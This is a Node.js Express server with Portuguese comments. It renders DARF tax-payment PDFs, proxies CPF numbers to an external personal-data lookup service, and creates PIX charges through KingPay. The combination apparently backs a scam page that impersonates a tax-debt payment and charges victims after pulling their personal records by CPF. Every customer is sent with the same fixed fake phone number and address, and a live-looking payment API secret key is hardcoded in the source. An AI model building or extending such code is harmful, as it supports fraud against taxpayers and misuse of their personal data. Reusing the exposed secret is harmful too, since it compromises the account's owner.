// server.js (raiz)
import express from "express";
import path from "node:path";
import { fileURLToPath } from "node:url";
import dotenv from "dotenv";
import axios from "axios";
import QRCode from "qrcode";

// suas rotas já existentes
import chatRoutes from "./src/routes/chat.js";
import identityRouter from "./src/routes/identity.js";
import pdfRoutes from "./src/routes/pdfRoutes.js";

// ------------------------------------------------------------------
// setup básico
// ------------------------------------------------------------------
dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// body parser
app.use(express.json({ limit: "2mb" }));

// nada de cache nas rotas de API
app.use((req, res, next) => {
  if (req.path.startsWith("/api") || req.path.startsWith("/chat")) {
    res.setHeader("Cache-Control", "no-store");
  }
  next();
});

// estáticos
const staticRoot = path.join(__dirname, "public");
console.log("Static root:", staticRoot);
app.use(express.static(staticRoot));
app.use("/audio", express.static(path.join(staticRoot, "audio")));

// rotas internas já existentes
app.use("/api/identity", identityRouter);
app.use("/chat", chatRoutes);
app.use("/api", pdfRoutes); // /api/darf/pdf

// página principal
app.get("/", (_req, res) => {
  res.sendFile(path.join(staticRoot, "index.html"));
});

// ------------------------------------------------------------------
// proxy CPF (formato exigido: /fp/<cpf> sem pontuação)
// ------------------------------------------------------------------
app.post("/cpf-lookup", async (req, res) => {
  try {
    const cpf = String(req.body?.cpf || "").replace(/\D+/g, "");
    if (cpf.length !== 11) {
      return res.status(400).json({ error: "CPF inválido" });
    }

    const resp = await fetch(
      `https://whs.lgpd.is/76c835864f2f8d03c53c/fp/${cpf}`,
      { method: "GET", headers: { accept: "application/json" } }
    );

    if (!resp.ok) {
      return res
        .status(resp.status)
        .json({ error: `Erro HTTP ${resp.status} ao consultar CPF` });
    }

    const data = await resp.json();
    res.json(data);
  } catch (err) {
    console.error("Erro cpf-lookup:", err);
    res.status(500).json({ error: "Falha ao consultar CPF" });
  }
});

// ------------------------------------------------------------------
// cria pagamento PIX (KingPay) e devolve qrcode + id + payload
// ------------------------------------------------------------------
app.post("/api/payments/pix", async (req, res) => {
  try {
    const SECRET = 'sk_like_OyHsqH5ej9S4xEadg3Qi3nDxMluebjxfNZEHMUNZPS0Y6IZB';
    if (!SECRET) {
      return res.status(500).json({ error: "KINGPAY_SECRET ausente no .env" });
    }

    const {
      nome,
      cpf,
      email,
      amount = 5990, // em centavos
      externalRef = "pedido-xyz",
    } = req.body || {};

    const cpfDigits = String(cpf || "").replace(/\D+/g, "");
    if (!nome || !email || cpfDigits.length !== 11) {
      return res.status(400).json({ error: "Dados inválidos (nome/email/cpf)" });
    }

    const basic = "Basic " + Buffer.from(`${SECRET}:x`).toString("base64");

    // payload conforme documentação da KingPay
    const payload = {
      amount: parseInt(amount, 10), // inteiro em centavos
      paymentMethod: "PIX",
      externalRef,
      customer: {
        name: nome,
        email,
        document: { number: cpfDigits, type: "cpf" },
        phone: "31900000000",
        address: {
          street: "Rua X",
          streetNumber: "1",
          complement: "",
          zipCode: "11050100",
          neighborhood: "Centro",
          city: "Santos",
          state: "SP",
          country: "BR",
        },
      },
      // items.unitPrice deve ser inteiro em centavos (obrigatório)
      items: [{ title: "produto", quantity: 1, unitPrice: parseInt(amount, 10) }],
    };

    const url = "https://api.kingpaybr.com/functions/v1/transactions";
    const resp = await axios.post(url, payload, {
      headers: {
        Authorization: basic,
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      timeout: 15000,
    });

    const data = resp.data || {};
    const qr = data?.pix?.qrcode || null;
    const id = data?.id || data?.transaction?.id || null;

    if (!qr || !id) {
      return res
        .status(500)
        .json({ ok: false, error: "Sem qrcode ou id no retorno da API", raw: data });
    }

    // devolve tanto o código (texto) quanto o id e todo o payload
    return res.json({ ok: true, id, tx: data, qrcode: qr });
  } catch (err) {
    const details = err?.response?.data || err?.message || String(err);
    console.error("PIX error:", details);
    return res.status(500).json({ ok: false, error: "Falha ao criar PIX", details });
  }
});

// ------------------------------------------------------------------
// checar status da transação na KingPay (seguro no back)
// GET /api/payments/status/:id
// ------------------------------------------------------------------
app.get("/api/payments/status/:id", async (req, res) => {
  try {
    const SECRET = process.env.KINGPAY_SECRET;
    if (!SECRET) {
      return res.status(500).json({ error: "KINGPAY_SECRET ausente no .env" });
    }

    const { id } = req.params;
    if (!id) return res.status(400).json({ error: "id obrigatório" });

    const basic = "Basic " + Buffer.from(`${SECRET}:x`).toString("base64");
    const url = `https://api.kingpaybr.com/functions/v1/transactions/${encodeURIComponent(id)}`;

    const r = await axios.get(url, {
      headers: { Authorization: basic, Accept: "application/json" },
      timeout: 15000,
    });

    const tx = r.data || {};
    const status = tx?.status || tx?.transaction?.status || "unknown";

    res.json({ ok: true, status, tx });
  } catch (err) {
    const details = err?.response?.data || err?.message || String(err);
    console.error("Status error:", details);
    res.status(500).json({ ok: false, error: "Falha ao consultar status", details });
  }
});

// ------------------------------------------------------------------
// gera PNG do QR Code a partir do texto (o front espera o onload)
// GET /api/pix/qrcode?text=<qrcode>
// ------------------------------------------------------------------
app.get("/api/pix/qrcode", async (req, res) => {
  try {
    const text = String(req.query.text || "");
    if (!text) return res.status(400).json({ error: "text obrigatório" });

    const png = await QRCode.toBuffer(text, {
      type: "png",
      width: 512,
      errorCorrectionLevel: "M",
      margin: 1,
    });

    res.setHeader("Content-Type", "image/png");
    res.send(png);
  } catch (err) {
    console.error("QR error:", err?.message || err);
    res.status(500).json({ error: "Falha ao gerar QR" });
  }
});

// ------------------------------------------------------------------
// start
// ------------------------------------------------------------------
const PORT = process.env.PORT || 3030;
app.listen(PORT, () => {
  console.log(`✅ Server ON em http://localhost:${PORT}`);
});
